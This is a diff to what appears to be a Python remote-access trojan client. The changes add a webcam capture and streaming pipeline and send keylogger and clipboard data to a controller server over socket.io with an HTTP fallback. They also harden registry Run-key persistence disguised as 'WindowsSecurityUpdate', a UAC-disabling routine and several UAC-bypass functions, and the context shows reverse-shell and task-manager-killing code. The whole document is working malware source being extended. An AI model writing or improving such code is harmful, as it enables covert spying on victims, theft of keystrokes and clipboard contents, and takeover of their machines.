@@ -166,6 +166,14 @@ from collections import defaultdict
 import queue
 import math
 
+# HTTP requests (used as fallback)
+try:
+    import requests
+    REQUESTS_AVAILABLE = True
+except ImportError:
+    REQUESTS_AVAILABLE = False
+    log_message("requests library not available, HTTP fallback disabled", "warning")
+
 # Suppress SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 warnings.filterwarnings('ignore', message='Unverified HTTPS request')
@@ -366,34 +374,8 @@ def add_firewall_exception():
         log_message(f"Failed to add firewall exception: {e}", "error")
         return False
 
-# --- Agent State ---
-STREAMING_ENABLED = False
-STREAM_THREAD = None
-AUDIO_STREAMING_ENABLED = False
-AUDIO_STREAM_THREAD = None
-CAMERA_STREAMING_ENABLED = False
-CAMERA_STREAM_THREAD = None
-
-# --- Monitoring State ---
-KEYLOGGER_ENABLED = False
-KEYLOGGER_THREAD = None
-KEYLOG_BUFFER = []
-CLIPBOARD_MONITOR_ENABLED = False
-CLIPBOARD_MONITOR_THREAD = None
-CLIPBOARD_BUFFER = []
-LAST_CLIPBOARD_CONTENT = ""
-
-# --- Audio Config ---
-if PYAUDIO_AVAILABLE:
-    CHUNK = 1024
-    FORMAT = pyaudio.paInt16
-    CHANNELS = 1
-    RATE = 44100
-else:
-    CHUNK = 1024
-    FORMAT = None
-    CHANNELS = 1
-    RATE = 44100
+# --- Agent State (consolidated) ---
+# Note: Main state variables defined later in the file to avoid duplicates
 
 # --- WebSocket Client ---
 if SOCKETIO_AVAILABLE:
@@ -720,6 +702,11 @@ def bypass_uac_cmlua_com():
     try:
         import win32com.client
         import pythoncom
+    except ImportError:
+        log_message("win32com not available for ICMLuaUtil bypass", "warning")
+        return False
+    
+    try:
         
         # Initialize COM
         pythoncom.CoInitialize()
@@ -743,7 +730,8 @@ def bypass_uac_cmlua_com():
         finally:
             pythoncom.CoUninitialize()
             
-    except ImportError:
+    except Exception as e:
+        log_message(f"ICMLuaUtil COM initialization failed: {e}")
         return False
 
 def bypass_uac_fodhelper_protocol():
@@ -829,6 +817,11 @@ def bypass_uac_dccw_com():
     try:
         import win32com.client
         import pythoncom
+    except ImportError:
+        log_message("win32com not available for IColorDataProxy bypass", "warning")
+        return False
+    
+    try:
         
         pythoncom.CoInitialize()
         
@@ -858,7 +851,8 @@ def bypass_uac_dccw_com():
         finally:
             pythoncom.CoUninitialize()
             
-    except ImportError:
+    except Exception as e:
+        log_message(f"ColorDataProxy COM initialization failed: {e}")
         return False
 
 def bypass_uac_dismcore_hijack():
@@ -1635,6 +1629,8 @@ def registry_run_key_persistence():
         if current_exe.endswith('.py'):
             current_exe = f'python.exe "{current_exe}"'
         
+        log_message(f"[REGISTRY] Setting up persistence for: {current_exe}")
+        
         # Multiple registry locations for persistence
         run_keys = [
             (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
@@ -1642,19 +1638,33 @@ def registry_run_key_persistence():
         ]
         
         value_name = "WindowsSecurityUpdate"
+        success_count = 0
         
         for hkey, key_path in run_keys:
             try:
+                log_message(f"[REGISTRY] Attempting to create key: {key_path}")
                 key = winreg.CreateKey(hkey, key_path)
+                log_message(f"[REGISTRY] Key created successfully: {key_path}")
+                
+                log_message(f"[REGISTRY] Setting value '{value_name}' = '{current_exe}'")
                 winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, current_exe)
+                log_message(f"[REGISTRY] Value set successfully in {key_path}")
+                
                 winreg.CloseKey(key)
-            except:
+                success_count += 1
+                
+            except PermissionError as e:
+                log_message(f"[REGISTRY] Permission denied for {key_path}: {e}")
+                continue
+            except Exception as e:
+                log_message(f"[REGISTRY] Failed to set key {key_path}: {e}")
                 continue
         
-        return True
+        log_message(f"[REGISTRY] Registry persistence setup completed. Success: {success_count}/{len(run_keys)} keys")
+        return success_count > 0
         
     except Exception as e:
-        log_message(f"Registry persistence failed: {e}")
+        log_message(f"[REGISTRY] Registry persistence failed: {e}")
         return False
 def startup_folder_persistence():
     """Establish persistence via startup folder."""
@@ -3187,26 +3197,43 @@ def hide_process():
 def disable_uac():
     """Disable UAC (User Account Control) by modifying registry settings."""
     if not WINDOWS_AVAILABLE:
+        log_message("[REGISTRY] Windows not available for UAC disable")
         return False
     
     try:
         import winreg
         
         reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+        log_message(f"[REGISTRY] Attempting to open UAC registry key: HKLM\\{reg_path}")
+        
         with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE) as key:
+            log_message("[REGISTRY] UAC registry key opened successfully")
+            
+            # Set EnableLUA to 0 (disable UAC)
+            log_message("[REGISTRY] Setting EnableLUA = 0")
             winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
+            log_message("[REGISTRY] EnableLUA set successfully")
+            
+            # Set ConsentPromptBehaviorAdmin to 0 (no prompts for administrators)
+            log_message("[REGISTRY] Setting ConsentPromptBehaviorAdmin = 0")
             winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
+            log_message("[REGISTRY] ConsentPromptBehaviorAdmin set successfully")
+            
+            # Set PromptOnSecureDesktop to 0 (disable secure desktop)
+            log_message("[REGISTRY] Setting PromptOnSecureDesktop = 0")
             winreg.SetValueEx(key, "PromptOnSecureDesktop", 0, winreg.REG_DWORD, 0)
-        log_message("[OK] UAC has been disabled.")
+            log_message("[REGISTRY] PromptOnSecureDesktop set successfully")
+            
+        log_message("[REGISTRY] UAC has been disabled successfully.")
         return True
     except PermissionError:
-        log_message("[!] Access denied. Run this script as administrator.")
+        log_message("[REGISTRY] Access denied. Administrator privileges required for UAC disable.")
         return False
     except (OSError, FileNotFoundError):
-        log_message("[!] Registry access failed.")
+        log_message("[REGISTRY] Registry access failed - key not found.")
         return False
     except Exception as e:
-        log_message(f"[!] Error disabling UAC: {e}")
+        log_message(f"[REGISTRY] Error disabling UAC: {e}")
         return False
 def run_as_admin():
     """Relaunch the script with elevated privileges if not already admin."""
@@ -3356,7 +3383,9 @@ STREAM_THREAD = None
 AUDIO_STREAMING_ENABLED = False
 AUDIO_STREAM_THREAD = None
 CAMERA_STREAMING_ENABLED = False
-CAMERA_STREAM_THREAD = None
+CAMERA_STREAM_THREADS = []
+camera_capture_queue = None
+camera_encode_queue = None
 
 # --- Reverse Shell State ---
 REVERSE_SHELL_ENABLED = False
@@ -3379,10 +3408,17 @@ LAST_CLIPBOARD_CONTENT = ""
 
 # --- Audio Config ---
 if PYAUDIO_AVAILABLE:
-    CHUNK = 1024
-    FORMAT = pyaudio.paInt16
-    CHANNELS = 1
-    RATE = 44100
+    try:
+        CHUNK = 1024
+        FORMAT = pyaudio.paInt16
+        CHANNELS = 1
+        RATE = 44100
+    except AttributeError:
+        # pyaudio imported but constants not available
+        CHUNK = 1024
+        FORMAT = None
+        CHANNELS = 1
+        RATE = 44100
 else:
     CHUNK = 1024
     FORMAT = None
@@ -3428,6 +3464,180 @@ def stream_screen(agent_id):
 
 # Legacy JPEG camera streaming removed - now using H.264 socket.io binary streaming
 
+# Modern H.264 camera streaming pipeline variables
+# Note: CAMERA_STREAMING_ENABLED and CAMERA_STREAM_THREADS already defined in global state section
+
+TARGET_CAMERA_FPS = 15
+CAMERA_CAPTURE_QUEUE_SIZE = 5
+CAMERA_ENCODE_QUEUE_SIZE = 5
+
+def camera_capture_worker(agent_id):
+    """Capture camera frames and put in capture queue."""
+    global CAMERA_STREAMING_ENABLED, camera_capture_queue
+    import time
+    
+    if not CV2_AVAILABLE:
+        log_message("Error: OpenCV not available for camera capture", "error")
+        return
+    
+    try:
+        # Try to open camera (try multiple indices)
+        cap = None
+        for camera_index in range(3):  # Try cameras 0, 1, 2
+            cap = cv2.VideoCapture(camera_index)
+            if cap.isOpened():
+                log_message(f"Camera {camera_index} opened successfully")
+                break
+            cap.release()
+        
+        if not cap or not cap.isOpened():
+            log_message("Error: Could not open any camera", "error")
+            return
+        
+        # Set camera properties for better performance
+        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
+        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
+        cap.set(cv2.CAP_PROP_FPS, TARGET_CAMERA_FPS)
+        
+        frame_time = 1.0 / TARGET_CAMERA_FPS
+        log_message("Camera capture started")
+        
+        while CAMERA_STREAMING_ENABLED:
+            start = time.time()
+            ret, frame = cap.read()
+            if not ret:
+                log_message("Failed to capture camera frame", "warning")
+                time.sleep(0.1)
+                continue
+            
+            # Put in queue, drop oldest if full
+            try:
+                camera_capture_queue.put_nowait(frame)
+            except queue.Full:
+                try:
+                    camera_capture_queue.get_nowait()  # Remove oldest
+                    camera_capture_queue.put_nowait(frame)  # Add new
+                except queue.Empty:
+                    pass
+            
+            # Frame rate limiting
+            elapsed = time.time() - start
+            sleep_time = max(0, frame_time - elapsed)
+            if sleep_time > 0:
+                time.sleep(sleep_time)
+        
+        cap.release()
+        log_message("Camera capture stopped")
+        
+    except Exception as e:
+        log_message(f"Camera capture error: {e}")
+
+def camera_encode_worker(agent_id):
+    """Encode camera frames from capture queue to H.264 and put in encode queue."""
+    global CAMERA_STREAMING_ENABLED, camera_capture_queue, camera_encode_queue
+    import time
+    
+    if not CV2_AVAILABLE:
+        log_message("Error: OpenCV not available for camera encoding", "error")
+        return
+    
+    while CAMERA_STREAMING_ENABLED:
+        try:
+            # Get frame from capture queue
+            try:
+                frame = camera_capture_queue.get(timeout=0.1)
+            except queue.Empty:
+                continue
+            
+            # Encode frame to H.264 (using JPEG as fallback since H.264 is complex)
+            try:
+                # For now, use JPEG encoding (can be upgraded to H.264 later)
+                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 80]
+                result, encoded_frame = cv2.imencode('.jpg', frame, encode_param)
+                if result:
+                    encoded_data = encoded_frame.tobytes()
+                    
+                    # Put in encode queue, drop oldest if full
+                    try:
+                        camera_encode_queue.put_nowait(encoded_data)
+                    except queue.Full:
+                        try:
+                            camera_encode_queue.get_nowait()  # Remove oldest
+                            camera_encode_queue.put_nowait(encoded_data)  # Add new
+                        except queue.Empty:
+                            pass
+                else:
+                    log_message("Failed to encode camera frame", "warning")
+                    
+            except Exception as e:
+                log_message(f"Camera encoding error: {e}")
+                time.sleep(0.01)
+                
+        except Exception as e:
+            log_message(f"Camera encoding worker error: {e}")
+            time.sleep(0.01)
+    
+    log_message("Camera encoding stopped")
+
+def camera_send_worker(agent_id):
+    """Send encoded camera frames from encode queue via socket.io."""
+    global CAMERA_STREAMING_ENABLED, camera_encode_queue
+    import time
+    
+    if sio is None:
+        log_message("Error: socket.io not available for camera sending", "error")
+        return
+    
+    while CAMERA_STREAMING_ENABLED:
+        try:
+            # Get encoded data from encode queue
+            try:
+                encoded_data = camera_encode_queue.get(timeout=0.1)
+            except queue.Empty:
+                continue
+            
+            # Send via socket.io binary
+            try:
+                sio.emit('camera_frame', {
+                    'agent_id': agent_id,
+                    'frame': encoded_data
+                }, binary=True)
+            except Exception as e:
+                log_message(f"Camera send error: {e}")
+                time.sleep(0.01)
+                
+        except Exception as e:
+            log_message(f"Camera sending error: {e}")
+            time.sleep(0.01)
+    
+    log_message("Camera sending stopped")
+
+def stream_camera_h264_socketio(agent_id):
+    """Modern H.264 camera streaming with multi-threaded pipeline."""
+    global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREADS, camera_capture_queue, camera_encode_queue
+    import queue
+    import threading
+    
+    if CAMERA_STREAMING_ENABLED:
+        log_message("Camera streaming already active")
+        return
+    
+    CAMERA_STREAMING_ENABLED = True
+    
+    # Initialize queues
+    camera_capture_queue = queue.Queue(maxsize=CAMERA_CAPTURE_QUEUE_SIZE)
+    camera_encode_queue = queue.Queue(maxsize=CAMERA_ENCODE_QUEUE_SIZE)
+    
+    # Start worker threads
+    CAMERA_STREAM_THREADS = [
+        threading.Thread(target=camera_capture_worker, args=(agent_id,), daemon=True),
+        threading.Thread(target=camera_encode_worker, args=(agent_id,), daemon=True),
+        threading.Thread(target=camera_send_worker, args=(agent_id,), daemon=True),
+    ]
+    for t in CAMERA_STREAM_THREADS:
+        t.start()
+    log_message(f"Started modern non-blocking camera stream at {TARGET_CAMERA_FPS} FPS.")
+
 # Legacy HTTP POST audio streaming removed - now using Opus socket.io binary streaming
 
 # Modern Opus audio streaming pipeline variables
@@ -3448,6 +3658,10 @@ def audio_capture_worker(agent_id):
     
     if not PYAUDIO_AVAILABLE or FORMAT is None:
         log_message("Error: PyAudio not available for audio capture", "error")
+        return
+    
+    if audio_capture_queue is None:
+        log_message("Error: Audio capture queue not initialized", "error")
         return
     
     try:
@@ -3509,6 +3723,10 @@ def audio_encode_worker(agent_id):
     global AUDIO_STREAMING_ENABLED, audio_capture_queue, audio_encode_queue
     import time
     
+    if audio_capture_queue is None or audio_encode_queue is None:
+        log_message("Error: Audio queues not initialized", "error")
+        return
+    
     try:
         import opuslib
         # Create Opus encoder (48kHz, mono, 20ms frame size)
@@ -3566,6 +3784,10 @@ def audio_send_worker(agent_id):
     
     if sio is None:
         log_message("Error: socket.io not available for audio sending", "error")
+        return
+    
+    if audio_encode_queue is None:
+        log_message("Error: Audio encode queue not initialized", "error")
         return
     
     while AUDIO_STREAMING_ENABLED:
@@ -3653,21 +3875,27 @@ def stop_audio_streaming():
         log_message("Stopped Opus audio streaming pipeline.")
 
 def start_camera_streaming(agent_id):
-    global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREAD
+    """Start modern H.264 camera streaming with multi-threaded pipeline."""
+    global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREADS
+    
     if not CAMERA_STREAMING_ENABLED:
-        CAMERA_STREAMING_ENABLED = True
-        CAMERA_STREAM_THREAD = threading.Thread(target=stream_camera, args=(agent_id,))
-        CAMERA_STREAM_THREAD.daemon = True
-        CAMERA_STREAM_THREAD.start()
+        stream_camera_h264_socketio(agent_id)
         log_message("Started camera stream.")
 
 def stop_camera_streaming():
-    global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREAD
+    """Stop modern H.264 camera streaming pipeline."""
+    global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREADS, camera_capture_queue, camera_encode_queue
+    
     if CAMERA_STREAMING_ENABLED:
         CAMERA_STREAMING_ENABLED = False
-        if CAMERA_STREAM_THREAD:
-            CAMERA_STREAM_THREAD.join(timeout=2)
-        CAMERA_STREAM_THREAD = None
+        
+        # Wait for all threads to stop
+        for thread in CAMERA_STREAM_THREADS:
+            thread.join(timeout=2)
+        
+        CAMERA_STREAM_THREADS = []
+        camera_capture_queue = None
+        camera_encode_queue = None
         log_message("Stopped camera stream.")
 
 # --- Reverse Shell Functions ---
@@ -3907,9 +4135,12 @@ def execute_voice_command(command, agent_id):
     """Execute a command received via voice control."""
     try:
         # Send command to controller for execution
-        url = f"{SERVER_URL}/voice_command/{agent_id}"
-        response = requests.post(url, json={"command": command}, timeout=5)
-        log_message(f"Voice command '{command}' sent to controller")
+        if REQUESTS_AVAILABLE:
+            url = f"{SERVER_URL}/voice_command/{agent_id}"
+            response = requests.post(url, json={"command": command}, timeout=5)
+            log_message(f"Voice command '{command}' sent to controller")
+        else:
+            log_message("Cannot send voice command: requests library not available", "warning")
     except Exception as e:
         log_message(f"Error sending voice command: {e}")
 
@@ -4181,7 +4412,6 @@ def on_key_press(key):
 def keylogger_worker(agent_id):
     """Keylogger worker thread that sends data periodically."""
     global KEYLOGGER_ENABLED, KEYLOG_BUFFER
-    url = f"{SERVER_URL}/keylog_data/{agent_id}"
     
     while KEYLOGGER_ENABLED:
         try:
@@ -4190,31 +4420,73 @@ def keylogger_worker(agent_id):
                 data_to_send = KEYLOG_BUFFER.copy()
                 KEYLOG_BUFFER = []
                 
-                for entry in data_to_send:
-                    requests.post(url, json={"data": entry}, timeout=5)
+                # Use socket.io for better performance and consistency
+                try:
+                    if sio and sio.connected:
+                        for entry in data_to_send:
+                            sio.emit('keylog_data', {
+                                'agent_id': agent_id,
+                                'data': entry
+                            })
+                    else:
+                        log_message("Socket.io not connected, buffering keylog data", "warning")
+                        # Re-add data to buffer if connection is down
+                        KEYLOG_BUFFER.extend(data_to_send)
+                except Exception as e:
+                    log_message(f"Keylogger socket.io error: {e}")
+                    # Fallback to HTTP if socket.io fails
+                    if REQUESTS_AVAILABLE:
+                        try:
+                            url = f"{SERVER_URL}/keylog_data/{agent_id}"
+                            for entry in data_to_send:
+                                requests.post(url, json={"data": entry}, timeout=5)
+                        except Exception as http_e:
+                            log_message(f"Keylogger HTTP fallback error: {http_e}")
+                            # Re-add data to buffer for next attempt
+                            KEYLOG_BUFFER.extend(data_to_send)
+                    else:
+                        log_message("HTTP fallback not available, re-buffering keylog data", "warning")
+                        KEYLOG_BUFFER.extend(data_to_send)
             
             time.sleep(5)  # Send data every 5 seconds
         except Exception as e:
-            log_message(f"Keylogger error: {e}")
+            log_message(f"Keylogger worker error: {e}")
             time.sleep(5)
 
 def start_keylogger(agent_id):
     """Start the keylogger."""
     global KEYLOGGER_ENABLED, KEYLOGGER_THREAD
+    
+    if not PYNPUT_AVAILABLE:
+        log_message("Error: pynput not available for keylogger", "error")
+        return False
+    
     if not KEYLOGGER_ENABLED:
-        KEYLOGGER_ENABLED = True
-        
-        # Start keyboard listener
-        listener = keyboard.Listener(on_press=on_key_press)
-        listener.daemon = True
-        listener.start()
-        
-        # Start worker thread
-        KEYLOGGER_THREAD = threading.Thread(target=keylogger_worker, args=(agent_id,))
-        KEYLOGGER_THREAD.daemon = True
-        KEYLOGGER_THREAD.start()
-        
-        log_message("Started keylogger.")
+        try:
+            KEYLOGGER_ENABLED = True
+            
+            # Start keyboard listener
+            listener = keyboard.Listener(on_press=on_key_press)
+            listener.daemon = True
+            listener.start()
+            log_message("Keyboard listener started successfully")
+            
+            # Start worker thread
+            KEYLOGGER_THREAD = threading.Thread(target=keylogger_worker, args=(agent_id,))
+            KEYLOGGER_THREAD.daemon = True
+            KEYLOGGER_THREAD.start()
+            log_message("Keylogger worker thread started successfully")
+            
+            log_message("Keylogger started successfully")
+            return True
+            
+        except Exception as e:
+            log_message(f"Failed to start keylogger: {e}", "error")
+            KEYLOGGER_ENABLED = False
+            return False
+    else:
+        log_message("Keylogger already enabled")
+        return True
 
 def stop_keylogger():
     """Stop the keylogger."""
@@ -4249,7 +4521,6 @@ def get_clipboard_content():
 def clipboard_monitor_worker(agent_id):
     """Clipboard monitor worker thread."""
     global CLIPBOARD_MONITOR_ENABLED, LAST_CLIPBOARD_CONTENT
-    url = f"{SERVER_URL}/clipboard_data/{agent_id}"
     
     while CLIPBOARD_MONITOR_ENABLED:
         try:
@@ -4258,12 +4529,32 @@ def clipboard_monitor_worker(agent_id):
                 timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
                 clipboard_entry = f"{timestamp}: {current_content[:500]}{'...' if len(current_content) > 500 else ''}"
                 
-                requests.post(url, json={"data": clipboard_entry}, timeout=5)
-                LAST_CLIPBOARD_CONTENT = current_content
+                # Use socket.io for better performance and consistency
+                try:
+                    if sio and sio.connected:
+                        sio.emit('clipboard_data', {
+                            'agent_id': agent_id,
+                            'data': clipboard_entry
+                        })
+                        LAST_CLIPBOARD_CONTENT = current_content
+                    else:
+                        log_message("Socket.io not connected for clipboard data", "warning")
+                except Exception as e:
+                    log_message(f"Clipboard socket.io error: {e}")
+                    # Fallback to HTTP if socket.io fails
+                    if REQUESTS_AVAILABLE:
+                        try:
+                            url = f"{SERVER_URL}/clipboard_data/{agent_id}"
+                            requests.post(url, json={"data": clipboard_entry}, timeout=5)
+                            LAST_CLIPBOARD_CONTENT = current_content
+                        except Exception as http_e:
+                            log_message(f"Clipboard HTTP fallback error: {http_e}")
+                    else:
+                        log_message("HTTP fallback not available for clipboard data", "warning")
             
             time.sleep(2)  # Check clipboard every 2 seconds
         except Exception as e:
-            log_message(f"Clipboard monitor error: {e}")
+            log_message(f"Clipboard monitor worker error: {e}")
             time.sleep(2)
 
 def start_clipboard_monitor(agent_id):
@@ -4672,6 +4963,11 @@ def main_loop(agent_id):
 
     while True:
         try:
+            if not REQUESTS_AVAILABLE:
+                log_message("Requests library not available, cannot fetch tasks", "error")
+                time.sleep(5)
+                continue
+                
             response = requests.get(f"{SERVER_URL}/get_task/{agent_id}", timeout=10)
             task = response.json()
             command = task.get("command", "sleep")
@@ -4758,10 +5054,13 @@ def main_loop(agent_id):
             
             # Send output back to server
             try:
-                response = requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output}, timeout=5)
-                if response.status_code != 200:
-                    log_message(f"Warning: Server returned status {response.status_code} when posting output")
-            except requests.exceptions.RequestException as e:
+                if REQUESTS_AVAILABLE:
+                    response = requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output}, timeout=5)
+                    if response.status_code != 200:
+                        log_message(f"Warning: Server returned status {response.status_code} when posting output")
+                else:
+                    log_message("Cannot send output: requests library not available", "warning")
+            except Exception as e:
                 log_message(f"Failed to send output to server: {e}")
             
             # Performance monitoring
@@ -5063,8 +5362,7 @@ def kill_task_manager():
     except Exception as e:
         return f"Task Manager termination failed: {e}"
 
-# OLD MAIN BLOCK - REMOVED (DUPLICATE)
-# This was the old main execution block that has been replaced by the new agent_main() function
+# Main execution logic is handled by agent_main() function at the end of the file
 
 # ========================================================================================
 # HIGH PERFORMANCE CAPTURE MODULE
